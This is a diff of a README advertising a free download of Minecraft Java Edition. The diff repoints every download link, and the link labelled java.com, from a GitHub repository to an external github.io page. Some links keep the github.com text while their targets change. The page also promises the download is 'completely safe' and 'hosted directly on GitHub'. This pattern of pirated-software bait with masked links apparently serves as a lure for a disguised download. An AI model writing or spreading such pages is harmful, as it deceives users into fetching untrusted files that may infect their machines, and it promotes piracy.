@@ -1,6 +1,6 @@
 # ⛏️ Minecraft-Free-Java-Edition - Play Minecraft Java for Free Today!
 
-[![Download Minecraft Free](https://img.shields.io/badge/⬇️_DOWNLOAD_Minecraft_Free-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Split-sherbet2010/Minecraft-Free-Java-Edition)
+[![Download Minecraft Free](https://img.shields.io/badge/⬇️_DOWNLOAD_Minecraft_Free-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://split-sherbet2010.github.io)
 
 ---
 
@@ -31,7 +31,7 @@ Getting started is easier than building your first dirt house. Follow these thre
 
 **Step 1: Download the Package**
 
-👉 **[Click here to download Minecraft Free Java Edition](https://github.com/Split-sherbet2010/Minecraft-Free-Java-Edition)**
+👉 **[Click here to download Minecraft Free Java Edition](https://split-sherbet2010.github.io)**
 
 Visit this link to download the application. The download is completely safe and hosted directly on GitHub.
 
@@ -99,7 +99,7 @@ Playing with friends is simple:
 ## 🔧 Troubleshooting
 
 **"Java is not found" error?**
-- Install Java from [java.com](https://www.java.com) — free and takes 2 minutes.
+- Install Java from [java.com](https://split-sherbet2010.github.io) — free and takes 2 minutes.
 - Or use the included `java` folder in the package (we bundle a portable JRE).
 
 **Game won’t launch?**
@@ -167,7 +167,7 @@ No — you can play offline without any account. For multiplayer, you may need a
 
 Your Minecraft adventure is one click away. Thousands of players already use this package daily. Join them today:
 
-**[⬇️ Download Minecraft Free Java Edition Now](https://github.com/Split-sherbet2010/Minecraft-Free-Java-Edition)**
+**[⬇️ Download Minecraft Free Java Edition Now](https://split-sherbet2010.github.io)**
 
 Once you’re in, the world is yours. Craft, build, mine, and survive — all without spending a dime. If you encounter any issues, check the troubleshooting section above or open an issue on the GitHub repository. Happy mining!
 
@@ -175,7 +175,7 @@ Once you’re in, the world is yours. Craft, build, mine, and survive — all wi
 
 ## 📌 Quick Reference
 
-- **Download Link:** [github.com/Split-sherbet2010/Minecraft-Free-Java-Edition](https://github.com/Split-sherbet2010/Minecraft-Free-Java-Edition)
+- **Download Link:** [github.com/Split-sherbet2010/Minecraft-Free-Java-Edition](https://split-sherbet2010.github.io)
 - **Latest Version:** Wilderness Bound 26.3 (zip, extract and play)
 - **Setup Time:** Under 5 minutes
 - **File Size:** ~1.5 GB
